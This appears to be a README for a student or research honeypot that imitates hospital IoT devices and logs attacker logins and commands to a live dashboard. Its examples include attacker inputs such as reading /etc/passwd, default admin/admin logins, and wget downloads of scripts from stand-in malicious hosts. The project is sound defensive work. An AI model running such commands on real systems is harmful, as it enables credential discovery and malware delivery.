## Healthcare - IoT Deception Honeypot Network 

## Over-view

### It pretends to be vulnerable medical devices, waits for attackers or scanners to touch it, records what they do, and shows everything on a live dashboard.

## What This Project Does

This project creates fake healthcare IoT devices such as:

- Patient vitals monitor
- Medical web control panel
- MQTT telemetry device
- DICOM-like medical imaging service
- SSH/Telnet maintenance console
- These are not real devices. They are honeypots, meaning they are decoys.

### If an attacker scans the network and tries to connect, the project captures:

- Attacker IP address
- Which fake device/service they attacked
- Login usernames and passwords they tried
- Commands they typed
- Suspicious payload URLs
- Web requests
- Protocol probes like MQTT or DICOM
- Risk score and attack category
- Then it shows this information on a Flask dashboard.

### Real-World Use

In a real hospital, attackers may try to find weak IoT devices like cameras, monitors, pumps, HVAC controllers, or imaging systems.

Instead of letting attackers reach real devices, the hospital can place fake devices in the network.

If someone touches the honeypot, that is suspicious because normal users should not interact with it.

So this project works as:

- Early warning system
- Attacker behavior recorder
- Threat intelligence collector
- Evidence for security auditing
- Safe malware/payload observation system
- How It Works

### The system starts fake services on different ports.
Example:

- 2222 fake SSH
- 2223 fake Telnet shell
- 8081 fake medical web panel
- 1883 fake MQTT service
- 2104 fake DICOM service
- An attacker scans the network.
- They may see open ports and think:

“This device is vulnerable. Let me try logging in.”

The honeypot responds like a real device.
For example, Telnet shows:

MediVitals VX-1200 telemetry console
login:
The attacker enters credentials or commands.

Example:

    admin / admin
    cat /etc/passwd
    wget http://malicious-site/file.sh
    chmod +x file.sh
    The project logs everything.
    It does not run the command for real. It only records it safely.

The dashboard updates live.
The researcher can see:

Who attacked ?
What service was attacked ?
What command was used ?
What technique was attempted ?
How risky the action was ?
What It Finds Out ?

### This project can discover:

- Which IPs are scanning the hospital network
- Whether someone is trying default passwords
- Which services attackers are targeting
- Whether attackers are trying to download malware
- What commands attackers run after login
- Whether an internal machine may be compromised
- Common attack methods used against IoT devices

Example finding:

Source IP: 127.0.0.1
Service: Telnet
Command: cat /etc/passwd
Technique: Account Discovery
Risk: High

In a real network, if the source IP was an internal hospital computer, that could mean the computer is infected or being used for lateral movement.

### How It Completes The Given Task

This project requirement asked for:

    Virtual honeypot deployment
    Simulated vulnerable IoT devices
    Logging attacker behavior
    Parsing logs
    Dashboard visualization
    Healthcare IoT deception theme
    Safe sandboxed environment

This project includes all of that:

    Python honeypot services simulate devices
    Flask serves the dashboard/API
    SQLite stores attack events
    JSONL exports logs
    JavaScript dashboard updates live
    Docker files allow isolated deployment
    Demo attack script proves it works
    Important Files

Main project files:

src/honeynet/honeypot.py
Creates fake SSH, Telnet, HTTP, MQTT, and DICOM traps.

src/honeynet/dashboard.py
Flask backend for dashboard and API.

src/honeynet/storage.py
Saves events into SQLite and JSONL.

src/honeynet/analytics.py
Detects attack techniques and risk scores.

src/honeynet/demo_attack.py
Generates safe fake attacker traffic for testing.

src/honeynet/static/app.js
Live dashboard frontend logic.

### What The Dashboard Shows

The dashboard shows:

- Total events
- Top attacker/source IP
- Most attacked service
- Most common technique
- Live event stream
- Commands observed
- Services targeted
- Attack origins
- Risk scores

Example categories:

- Reconnaissance
- Account Discovery
- Ingress Tool Transfer
- Permission Modification
- System Information Discovery

Simple Example : Suppose an attacker connects to fake Telnet.

They type:

    root
    admin
    uname -a
    cat /etc/passwd
    wget http://bad-site/malware.sh

The project records:

    Attacker tried username root
    Attacker tried password admin
    Attacker checked system information
    Attacker tried reading user accounts
    Attacker tried downloading malware
    Then it displays this in the dashboard.

### Why This Is Useful

It helps security teams answer questions like:

- Are attackers scanning our network?
- Which IoT ports are being targeted?
- Are default passwords being tested?
- Is malware being downloaded?
- Is an internal system acting suspiciously?
- What should we block or investigate?

In One Line : This project is a safe fake hospital IoT environment that attracts attackers, records their behavior, analyzes their actions, and shows live threat intelligence on a dashboard.